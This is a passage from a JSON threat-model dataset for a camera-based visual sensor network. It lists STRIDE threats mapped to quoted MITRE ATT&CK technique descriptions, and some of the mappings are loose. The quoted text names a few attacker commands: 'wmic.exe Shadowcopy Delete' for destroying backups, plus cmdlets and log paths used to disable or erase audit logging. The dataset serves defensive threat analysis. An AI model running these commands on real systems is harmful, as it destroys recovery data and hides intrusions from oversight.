                "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
                "id": "attack-pattern--06780952-177c-4247-b978-79c357fb311f",
                "technique_id": "T1150"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the transmitted visual data by intercepting and altering the data packets over the network.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption for data in transit"
                },
                {
                    "Assumption": "The attacker has network access",
                    "Role": "Attacker",
                    "Condition": "Weak network perimeter defenses"
                }
            ],
            "Potential Impact": "Corruption of visual data leading to loss of data integrity and potentially disrupting services.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data packets",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions on the VSN but denies involvement due to lack of proper logging and audit trails.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficient or disabled",
                    "Role": "System Designer",
                    "Condition": "Inadequate logging practices"
                },
                {
                    "Assumption": "No non-repudiation measures are in place",
                    "Role": "System Designer",
                    "Condition": "Lack of non-repudiation controls"
                }
            ],
            "Potential Impact": "Difficulty in tracking changes and identifying the attacker, affecting the integrity of forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploits the absence of transaction logs to reverse or alter recorded transactions in the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Transaction logging is not implemented",
                    "Role": "System Designer",
                    "Condition": "Lack of read-only transaction logs"
                },
                {
                    "Assumption": "No tamper-proof logging mechanism",
                    "Role": "System Designer",
                    "Condition": "Logs are stored in a tamperable format"
                }
            ],
            "Potential Impact": "Loss of data integrity and authenticity, making it difficult to verify legitimate actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "transaction",
                "alteration",
                "audit"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses unsanctioned administrative commands but log data is inaccessible or incomplete, enabling denial of actions.",
            "Assumptions": [
                {
                    "Assumption": "Log data is not protected or complete",
                    "Role": "System Designer",
                    "Condition": "Logs are either improperly stored or not detailed"
                },
                {
                    "Assumption": "Administrative access is not strictly controlled",
                    "Role": "Administrator",
                    "Condition": "Weak administrative policies"
                }
            ],
            "Potential Impact": "Inability to trace malicious activities back to the attacker, compromising the integrity of the security oversight.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "administrative commands",
                "log data",
                "malicious activity"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmissions to eavesdrop on live video feeds.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption protocols for data in transit"
                },
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Attacker",
                    "Condition": "Weak network security measures"
                }
            ],
            "Potential Impact": "Unauthorized viewing of sensitive visual data, severely affecting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "data transmission",
                "unencrypted"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive configuration files containing access credentials are exposed due to improper file permissions.",
            "Assumptions": [
                {
                    "Assumption": "File permissions are misconfigured",
                    "Role": "System Administrator",
                    "Condition": "Improper permissions and access controls"
                },
                {
                    "Assumption": "Access to sensitive folders is not restricted",
                    "Role": "System Designer",
                    "Condition": "Weak folder access restrictions"
                }
            ],
            "Potential Impact": "Exposure of access credentials, compromising system security and data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "file permissions",
                "access credentials",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker leverages a known vulnerability to extract sensitive data from the VSN's database.",
            "Assumptions": [
                {
                    "Assumption": "The system uses a vulnerable database version",
                    "Role": "System Designer",
                    "Condition": "Failure to update and patch the database"
                },
                {
                    "Assumption": "No encryption for stored data",
                    "Role": "System Designer",
                    "Condition": "Sensitive data stored in plaintext"
                }
            ],
            "Potential Impact": "Leakage of sensitive information, causing a severe breach of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database",
                "vulnerability",
                "data extraction"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the VSN with a flood of requests, causing it to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting mechanisms in place",
                    "Role": "System Designer",
                    "Condition": "Lack of traffic control measures"
                },
                {
                    "Assumption": "Network is open to traffic from untrusted sources",
                    "Role": "Network Administrator",
                    "Condition": "Weak network filtering policies"
                }
            ],
            "Potential Impact": "System unavailability and interruption of data transmission, affecting operational continuity.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flood",
                "unresponsive",
                "requests"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of a known vulnerability in the software running on camera nodes to crash the nodes.",
            "Assumptions": [
                {
                    "Assumption": "The nodes run vulnerable software",
                    "Role": "System Designer",
                    "Condition": "Failure to update and patch vulnerabilities"
                },
                {
                    "Assumption": "No mechanisms to detect tampering or crashes",
                    "Role": "System Administrator",
                    "Condition": "Lack of node monitoring"
                }
            ],
            "Potential Impact": "Disruption of visual data capture and transmission, compromising availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "software crash",
                "vulnerability",
                "nodes"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed data packets to the central hub, triggering memory overload and causing the hub to shut down.",
            "Assumptions": [
                {
                    "Assumption": "The central hub is vulnerable to malformed packets",
                    "Role": "System Designer",
                    "Condition": "Lack of input validation and handling for invalid packets"
                },
                {
                    "Assumption": "An attacker can access the network",
                    "Role": "Attacker",
                    "Condition": "Weak network access controls"
                }
            ],
            "Potential Impact": "Central hub shutdown, leading to system-wide unavailability and loss of real-time data transmission.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malformed packets",
                "central hub",
                "memory overload"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability in the Linux kernel to gain root access on the central hub.",
            "Assumptions": [
                {
                    "Assumption": "The system is running a vulnerable Linux version",
                    "Role": "System Designer",
                    "Condition": "Failing to update and patch Linux kernel"
                },
                {
                    "Assumption": "The attacker has lower-level access to the system",
                    "Role": "Attacker",
                    "Condition": "Initial unauthorized access"
                }
            ],
            "Potential Impact": "Full control of the central hub by the attacker, jeopardizing all aspects: confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "Linux kernel",
                "root access",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a buffer overflow attack on the VSN\u2019s management interface to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "The management interface is not protected against buffer overflows",
                    "Role": "System Designer",
                    "Condition": "Lack of input validation and buffer management"
                },
                {
                    "Assumption": "Attacker has access to the management interface",
                    "Role": "Attacker",
                    "Condition": "Weak interface access controls"
                }
            ],
            "Potential Impact": "Unauthorized privilege escalation, leading to potential tampering with data and system settings.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "buffer overflow",
                "management interface",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a vulnerability to inject code into the VSN's services, thereby gaining elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The system is vulnerable to code injection",
                    "Role": "System Designer",
                    "Condition": "Weakness in code execution environment"
                },
                {
                    "Assumption": "The attacker can execute payload delivery",
                    "Role": "Attacker",
                    "Condition": "Lack of protective measures against payloads"
                }
            ],
            "Potential Impact": "Unauthorized actions with elevated privileges, potentially compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "services",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Windows Management Instrumentation",
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
                "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
                "technique_id": "T1047"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates camera nodes to inject malicious visual data into the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can obtain or guess valid camera node credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak or easily guessable credentials are used."
                },
                {
                    "Assumption": "Network traffic is not securely encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Lack of transport layer security."
                },
                {
                    "Assumption": "No multi-factor authentication is in place.",
                    "Role": "System Administrator",
                    "Condition": "Single factor authentication methods are used."
                }
            ],
            "Potential Impact": "Unauthorized data injection, leading to false visual data.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "network sniffing",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of an administrator to gain control of camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept administrator login credentials.",
                    "Role": "Attacker",
                    "Condition": "Use of unsecured protocols or phishing attacks."
                },
                {
                    "Assumption": "The system does not verify the origin of requests.",
                    "Role": "System Administrator",
                    "Condition": "Lack of IP whitelisting or device fingerprinting."
                },
                {
                    "Assumption": "Weak password policies are enforced.",
                    "Role": "System Administrator",
                    "Condition": "Simple or reused passwords are allowed."
                }
            ],
            "Potential Impact": "Complete control over camera nodes, unauthorized access to visual feeds.",
            "MITRE ATT&CK Keywords": [
                "administrator account",
                "credential access",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
